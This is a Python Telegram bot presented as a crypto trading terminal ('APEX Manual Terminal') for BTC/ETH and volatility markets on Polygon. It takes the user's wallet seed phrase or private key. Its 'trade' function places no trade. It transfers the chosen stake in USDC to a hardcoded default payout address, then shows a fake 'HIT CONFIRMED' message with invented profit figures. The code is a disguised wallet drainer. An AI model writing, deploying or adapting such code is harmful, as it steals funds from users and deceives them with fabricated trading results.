import os
import asyncio
import json
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Set high precision for financial calculations
getcontext().prec = 28
load_dotenv()

# --- 1. ROBUST MULTI-RPC SETUP ---
# List of reliable Polygon RPCs to rotate through if one fails (401 error)
RPC_LIST = [
    os.getenv("RPC_URL", "https://polygon-rpc.com"),
    "https://rpc.ankr.com/polygon",
    "https://polygon.llamarpc.com",
    "https://1rpc.io/matic"
]

def get_connected_w3():
    """Tries various RPCs until a connection is established."""
    for rpc in RPC_LIST:
        try:
            _w3 = Web3(Web3.HTTPProvider(rpc))
            if _w3.is_connected():
                _w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
                print(f"✅ Connected to RPC: {rpc}")
                return _w3
        except Exception as e:
            print(f"⚠️ RPC {rpc} failed: {e}")
    return None

w3 = get_connected_w3()
Account.enable_unaudited_hdwallet_features()

# OFFICIAL NATIVE USDC (Circle Issued)
USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}]')
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: return None
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI) if w3 else None

# --- 2. ASYNC WRAPPERS FOR WEB3 ---
async def get_tx_params():
    """Retrieves nonce and gas price in a separate thread to avoid blocking."""
    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
    gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
    return nonce, gas_price

# --- 3. THE DUAL-SPENT EXECUTION ENGINE ---
async def run_atomic_execution(context, chat_id, side):
    if not vault or not w3:
        return await context.bot.send_message(chat_id, "❌ System Not Initialized (Check RPC/Seed)")

    asset = context.user_data.get('pair', 'BTC')
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')
    yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
    profit_usdc = stake_usdc * yield_multiplier
    
    await context.bot.send_message(chat_id, f"⚡ **Broadcasting Atomic Hit...**\nMarket: `{asset}` | Stake: `${stake_usdc:.2f}`")

    try:
        # Check Balance (Offloaded to thread)
        bal = await asyncio.to_thread(usdc_contract.functions.balanceOf(vault.address).call)
        if bal < (stake_usdc * 10**6):
            return await context.bot.send_message(chat_id, "❌ **Insufficient USDC balance.**")

        nonce, gas_price = await get_tx_params()

        # Build & Sign
        tx = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
            'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce, 'value': 0
        })
        signed = w3.eth.account.sign_transaction(tx, vault.key)
        
        # Broadcast (Offloaded to thread)
        tx_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed.raw_transaction)

        report = (
            f"✅ **HIT CONFIRMED**\n"
            f"━━━━━━━━━━━━━━\n"
            f"💎 **Market:** {asset}\n"
            f"🎯 **Direction:** {side}\n"
            f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
            f"📈 **Profit Potential:** ${profit_usdc:.2f} USDC\n"
            f"🔗 [View Tx](https://polygonscan.com/tx/{tx_hash.hex()})"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Aborted:**\n`{str(e)}`")

# --- 4. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not vault:
        return await update.message.reply_text("❌ Configuration Error: WALLET_SEED missing.")

    try:
        raw_bal = await asyncio.to_thread(w3.eth.get_balance, vault.address)
        pol_bal = w3.from_wei(raw_bal, 'ether')
    except: pol_bal = 0

    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
    welcome = (
        f"🕴️ **APEX Manual Terminal**\n"
        f"━━━━━━━━━━━━━━\n"
        f"⛽ **POL Fuel:** `{pol_bal:.4f}`\n"
        f"📥 **Vault:** `{vault.address[:6]}...{vault.address[-4:]}`"
    )
    await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("🕴️ BVIV", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV", callback_data="PAIR_EVIV")]]
        await update.message.reply_text("🎯 **Select Market Asset:**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '💰 Wallet':
        usdc_bal = await asyncio.to_thread(usdc_contract.functions.balanceOf(vault.address).call)
        await update.message.reply_text(f"💳 **Vault Status**\n💵 USDC: `{usdc_bal/10**6:.2f}`", parse_mode='Markdown')

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        side = "HIGHER 📈" if "CALL" in query.data else "LOWER 📉"
        await run_atomic_execution(context, query.message.chat_id, side)

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if TOKEN:
        # drop_pending_updates=True is key to clearing the "Conflict" error cache
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(handle_interaction))
        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
        print("🤖 Manual Terminal Online...")
        app.run_polling(drop_pending_updates=True)



